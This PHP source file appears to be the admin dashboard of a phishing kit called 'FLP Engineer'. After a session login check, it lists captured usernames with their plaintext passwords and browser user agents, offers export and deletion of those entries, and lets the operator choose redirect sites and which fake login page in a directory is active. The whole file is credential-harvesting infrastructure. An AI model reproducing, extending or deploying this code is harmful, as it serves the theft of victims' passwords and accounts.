<?php

session_start();

include 'classes/users.php';
include '../lang/' . LOCALISATION . '.php';
$users = new Users(); //Instantiate class
$db = new Database();

//Check if logged in or send to login
if(!isset($_SESSION['logged']) OR $_SESSION['logged'] != TRUE)
{
    header('location: login.php');
    exit;
}

$logs = $db->get_logs();
$sites = $db->get_sites();

if ($handle = opendir('../flps')) {
   $dir_array = array();
    while (false !== ($file = readdir($handle))) {
        if($file!="." && $file!=".."){
            $dir_array[] = $file;
        }
    }
    closedir($handle);
}

$active_flps = $db->get_active_flp();
while($row = $active_flps->fetch_assoc())
{
	$active_flp = $row['config_value'];
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title><?php echo $lang['FLP_ENGINEER']; ?></title>

<link rel="stylesheet" type="text/css" href="styles/default.css" media="screen, print" />
<link rel="stylesheet" type="text/css" href="styles/colorbox.css" type="text/css" media="screen, projection" />

<script type="text/javascript" src="scripts/jquery.js"></script>
<script type="text/javascript" src="scripts/jquery.colorbox-min.js"></script>
<script type="text/javascript" src="scripts/default.js"></script>
</head>
<body>
<div id="wrapper">
	<div id="header">
		<h1><?php echo $lang['FLP_ENGINEER']; ?></h1>
		
		<ul id="account">
			<li><a href="#" id="add_user_btn"><?php echo $lang['ADD_USER']; ?></a></li>
			<li><a href="login.php?action=logout"><?php echo $lang['LOGOUT']; ?></a></li>
		</ul>
	</div>
	
	<div class="module wide">
		<h2><?php echo $lang['FLP_LOGS']; ?> (<?php echo $logs->num_rows . ' ' . $lang['LOGS']; ?>)</h2>
		
		<form action="modify.php" method="post" class="manage">							
			<ol id="db">
			<?php if($logs && $logs->num_rows > 0): ?>
				<?php while($row = $logs->fetch_assoc()): ?>
					<li>
						<span class="time"><?php echo date("d M Y", $row['user_time']); ?></span>
						<div class="info">
							<strong><?php echo $row['user_name']; ?></strong> � <?php echo $row['user_password']; ?> 
							<span class="opts"><input type="checkbox" name="userid[]" value="<?php echo $row['user_id']; ?>" /></span><br />
							<span class="details"><?php echo $row['user_agent']; ?></span>
						</div>
					</li>
				<?php endwhile; ?>
			<?php else: ?>
				<li><?php echo $lang['NO_LOGINS']; ?></li>
			<?php endif; ?>
			</ol>
			
			<div class="actions">
				<select name="action">
					<option value="export_logs"><?php echo $lang['EXPORT']; ?></option>
					<option value="delete_logs"><?php echo $lang['DELETE']; ?></option>
				</select>
				<label for="action"><?php echo $lang['MARKED_LOGS']; ?></label>
				<input type="hidden" name="backtrack" value="index.php" />
				<input type="submit" name="submit" value="now" />
			</div>
		</form>
	</div>
	
	<div class="module narrow">
		<form action="modify.php" method="post" class="manage">
			<ul class="side_list">
				<li><h2><?php echo $lang['FLP_REDIRECTS']; ?> (<?php echo $sites->num_rows . ' ' . $lang['REDIRECTS']; ?>)</h2></li>
				<?php if($sites && $sites->num_rows > 0):?>
					<?php while($row = $sites->fetch_assoc()):?>
						<li>
							<span class="redirect"><a href="<?php echo $row['site_redirect']; ?>"><?php echo $row['site_redirect']; ?></a></span> <?php echo ($row['site_active']) ? '(Active)' : ''; ?>
							<span class="opts"><input type="radio" name="siteid" value="<?php echo $row['site_id']; ?>" /></span>
						</li>
					<?php endwhile; ?>
				<?php else: ?>
					<li><?php echo $lang['NO_SITES']; ?></li>
				<?php endif; ?>
				
				<li><a href="#add_site_form" id="add_site_btn"><?php echo $lang['ADD_NEW_SITE']; ?></a></li>
			</ul>
			
			<div class="actions">
				<select name="action">
					<option value="activate_site"><?php echo $lang['ACTIVATE']; ?></option>
					<option value="delete_site"><?php echo $lang['DELETE']; ?></option>
				</select>
				<label for="action"><?php echo $lang['MARKED_SITES']; ?></label>
				<input type="hidden" name="backtrack" value="index.php" />
				<input type="submit" name="submit" value="now" />
			</div>
		</form>
	</div>
	
	<div class="module narrow">
		<form action="modify.php" method="post" class="manage">
			<ul class="side_list">
				<li><h2><?php echo $lang['FLP_DIRECTORY']; ?></h2></li>
				<?php foreach($dir_array as $file):?>
					<li>
						<?php echo $file . (($file === $active_flp) ? ' (Active)' : ''); ?>
						<span class="opts"><input type="radio" name="flp_url" value="<?php echo $file; ?>" /></span>
					</li>
				<?php endforeach;?>
			</ul>
			
			<div class="actions">
				<input type="hidden" name="action" value="activate_flp" />
				<input type="hidden" name="backtrack" value="index.php" />
				<input type="submit" name="submit" value="<?php echo $lang['SET_FLP']; ?>" />
			</div>
		</form>
	</div>
	
	<div class="clear"></div>
	
	<div id="footer">
		<?php echo $lang['COPY']; ?>
	</div>
</div>
</body>
</html>